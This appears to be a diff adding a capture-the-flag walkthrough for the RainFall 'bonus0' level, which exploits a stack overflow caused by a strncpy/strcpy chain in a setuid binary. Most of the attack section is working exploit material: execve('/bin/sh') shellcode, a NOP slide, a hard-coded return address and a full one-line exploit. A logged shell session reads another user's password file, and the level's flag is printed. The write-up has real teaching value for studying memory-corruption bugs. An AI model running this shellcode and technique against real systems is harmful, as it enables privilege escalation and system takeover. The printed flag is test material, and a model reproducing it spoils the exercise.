@@ -1,0 +1,143 @@
+# Bonus0 - Complete Exploitation Walkthrough
+
+## Binary Analysis
+```bash
+bonus0@RainFall:~$ file bonus0
+bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, dynamically linked
+
+bonus0@RainFall:~$ ./bonus0
+ - 
+test1
+ - 
+test2
+test1 test2
+```
+
+## Vulnerability Discovery
+
+### Initial Testing
+```bash
+# Test with long strings
+bonus0@RainFall:~$ ./bonus0
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ - 
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
+Segmentation fault (core dumped)
+```
+
+### GDB Analysis
+```bash
+gdb -q bonus0
+(gdb) info functions
+# Shows: main, pp, p functions
+(gdb) disas pp
+# Reveals strcpy() and strcat() calls
+(gdb) disas p  
+# Shows strncpy() without null termination
+```
+
+## Root Cause Analysis
+
+### The Critical Flaw
+1. **Function p()**: Uses `strncpy(s, buffer, 20)` 
+   - If input > 20 chars → **NO null terminator added**
+2. **Function pp()**: Uses `strcpy(buffer, a)`
+   - Reads past a[20] into b[20] when a is not null-terminated
+3. **Buffer Overflow**: Combined strings overflow main buffer[42]
+
+### Memory Layout
+```
+Stack in pp():
+a[20] → not null-terminated if input > 20 chars
+b[20] → gets concatenated  
+When strcpy(buffer, a) runs → reads a + b + stack data
+Result: buffer[42] overflow → return address overwrite
+```
+
+## Exploitation Steps
+
+### Step 1: Find Buffer Address
+```gdb
+(gdb) disas p
+   0x080484d0 <+28>: lea -0x1008(%ebp),%eax  ; buffer at ebp-0x1008
+(gdb) break *p+28
+(gdb) run
+(gdb) x $ebp-0x1008
+0xbfffe640: 0x00000000  ; Buffer starts at 0xbfffe640
+```
+
+### Step 2: Calculate EIP Offset
+- Main buffer[42] + saved registers = 14 bytes to EIP
+- Confirmed via pattern testing: EIP overwrite at offset 14
+
+### Step 3: Craft Shellcode
+```bash
+# 23-byte execve("/bin/sh") shellcode:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+### Step 4: Create NOP Slide
+- 3000 bytes of `\x90` (NOP instructions)
+- Provides large target area for return address
+- Shellcode placed at end of NOP slide
+
+### Step 5: Calculate Return Address
+- Target: Middle of NOP slide = 0xbfffe640 + 100 = 0xbfffe6a4
+- Little endian format: `\xa4\xe6\xff\xbf`
+
+## Final Exploit Construction
+
+### Input 1 (First " - " prompt):
+```python
+python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"
+```
+- Creates 3000-byte NOP slide + shellcode
+- strncpy() takes first 20 bytes (all NOPs)
+- No null termination occurs
+
+### Input 2 (Second " - " prompt):
+```python
+python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"
+```
+- 14 bytes padding to reach return address
+- Return address pointing to NOP slide  
+- Extra byte for alignment
+
+### Complete Exploit:
+```bash
+(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ./bonus0
+```
+
+## Execution Result
+```bash
+bonus0@RainFall:~$ (python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ./bonus0
+ - 
+ - 
+��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+```
+
+## Attack Flow Summary
+1. **Input 1**: NOP slide fills buffer, strncpy() doesn't null-terminate
+2. **Input 2**: strcpy() reads past a[20] into b[20], causing overflow  
+3. **Overflow**: Combined data overflows main buffer[42]
+4. **EIP Overwrite**: Return address replaced with NOP slide address
+5. **Shell Execution**: CPU jumps to NOP slide → slides to shellcode → execve("/bin/sh")
+
+## Flag Retrieved
+```
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+## Key Learning Points
+- **strncpy() Danger**: Always manually add null terminator
+- **String Function Chaining**: strcpy() after strncpy() creates overflow risk
+- **NOP Slide Technique**: Large target area compensates for address uncertainties  
+- **Stack Layout**: Understanding function call frame structure enables precise exploitation
